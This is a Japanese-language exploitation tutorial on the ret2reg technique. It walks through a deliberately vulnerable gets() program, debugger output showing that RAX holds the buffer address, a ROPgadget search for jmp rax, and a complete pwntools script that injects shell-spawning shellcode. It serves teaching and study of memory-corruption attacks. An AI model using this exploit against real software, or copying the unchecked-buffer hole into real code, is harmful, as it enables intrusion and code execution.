# Using ret2reg

## Source

処理した後に文字列へのポインタを返す関数は、格好の標的です。`gets()`、`strcpy()`、`fgets()` など、そのような関数は数多くあります。ここでは単純にするために、`gets()` を例として使います。

```c
#include <stdio.h>

void vuln() {
    char buffer[100];
    gets(buffer);
}

int main() {
    vuln();
    return 0;
}
```

## Analysis

まず、あるレジスタが本当にバッファを指していることを確認しましょう。

```text
$ r2 -d -A vuln

[0x7f8ac76fa090]> pdf @ sym.vuln 
            ; CALL XREF from main @ 0x401147
┌ 28: sym.vuln ();
│           ; var int64_t var_70h @ rbp-0x70
│           0x00401122      55             push rbp
│           0x00401123      4889e5         mov rbp, rsp
│           0x00401126      4883ec70       sub rsp, 0x70
│           0x0040112a      488d4590       lea rax, [var_70h]
│           0x0040112e      4889c7         mov rdi, rax
│           0x00401131      b800000000     mov eax, 0
│           0x00401136      e8f5feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0040113b      90             nop
│           0x0040113c      c9             leave
└           0x0040113d      c3             ret
```

次に、`vuln()` の `ret` にブレークポイントを設定し、実行を続けてテキストを入力します。

```text
[0x7f8ac76fa090]> db 0x0040113d
[0x7f8ac76fa090]> dc
hello
hit breakpoint at: 40113d
```

ブレークポイントに到達しました。RAX が入力したバッファを指しているか確認しましょう。戻り値に使う伝統的なレジスタなので、まず RAX だと仮定します。

```text
[0x0040113d]> dr rax
0x7ffd419895c0
[0x0040113d]> ps @ 0x7ffd419895c0
hello
```

確かに指しています。

## Exploitation

あとは `jmp rax` ガジェットか、それと同等のものがあればよいだけです。ここでは [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) を使い、`jmp rax` か `call rax` のどちらかを探します。

```text
$ ROPgadget --binary vuln | grep -iE "(jmp|call) rax"

0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401019 ; call rax
0x0000000000401010 : call rax
0x000000000040100e : je 0x401014 ; call rax
0x0000000000401095 : je 0x4010a7 ; mov edi, 0x404030 ; jmp rax
0x00000000004010d7 : je 0x4010e7 ; mov edi, 0x404030 ; jmp rax
0x000000000040109c : jmp rax
0x0000000000401097 : mov edi, 0x404030 ; jmp rax
0x0000000000401096 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x000000000040100c : test eax, eax ; je 0x401016 ; call rax
0x0000000000401093 : test eax, eax ; je 0x4010a9 ; mov edi, 0x404030 ; jmp rax
0x00000000004010d5 : test eax, eax ; je 0x4010e9 ; mov edi, 0x404030 ; jmp rax
0x000000000040100b : test rax, rax ; je 0x401017 ; call rax
```

`0x40109c` に `jmp rax` があるので、これを使います。RIP までのパディングは `120` です。ここまで来れば自分で計算できるはずなので、その手順は示しません。

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

JMP_RAX = 0x40109c

payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
payload = payload.ljust(120, b'A')    # pad until RIP
payload += p64(JMP_RAX)               # jump to the buffer - return value of gets()

p.sendline(payload)
p.interactive()
```

![](../../../../.gitbook/assets/image%20%2846%29.png)

すばらしい。
